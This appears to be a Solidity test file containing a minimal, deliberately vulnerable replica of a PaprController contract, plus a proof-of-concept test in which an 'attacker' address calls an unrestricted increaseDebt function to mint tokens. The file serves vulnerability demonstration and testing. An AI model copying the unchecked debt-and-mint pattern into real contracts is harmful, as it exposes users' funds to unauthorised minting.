// Minimal stubs for types used in the real contract
contract ReservoirOracleUnderwriter { struct OracleInfo { uint256 dummy; } }
contract ERC721 {}

// Minimal vulnerable replica
contract PaprController {
    mapping(address => uint256) public debts;
    mapping(address => uint256) public minted;

    // Vulnerable: anyone can call and cause debt to increase + mint tokens to arbitrary recipient
    function increaseDebt(
        address mintTo,
        ERC721 asset,
        uint256 amount,
        ReservoirOracleUnderwriter.OracleInfo calldata oracleInfo
    ) external {
        // call internal function positionally to avoid named-arg mismatches in tests
        _increaseDebt(msg.sender, asset, mintTo, amount, oracleInfo);
    }

    function _increaseDebt(
        address account,
        ERC721 /*asset*/,
        address mintTo,
        uint256 amount,
        ReservoirOracleUnderwriter.OracleInfo calldata /*oracleInfo*/
    ) internal {
        debts[account] += amount;
        minted[mintTo] += amount;
    }
}

contract PaprControllerTest is Test {
    PaprController target;
    address attacker;

    function setUp() public {
        target = new PaprController();
        attacker = makeAddr("attacker");
    }

    function test_attacker_exploits_increaseDebt() public {
        vm.prank(attacker);
        // attacker calls increaseDebt and mints to themselves
        target.increaseDebt(attacker, ERC721(address(0)), 100, ReservoirOracleUnderwriter.OracleInfo({dummy: 0}));

        // attacker gained minted tokens and debt was recorded under their account
        assertEq(target.minted(attacker), 100);
        assertEq(target.debts(attacker), 100);
    }
}

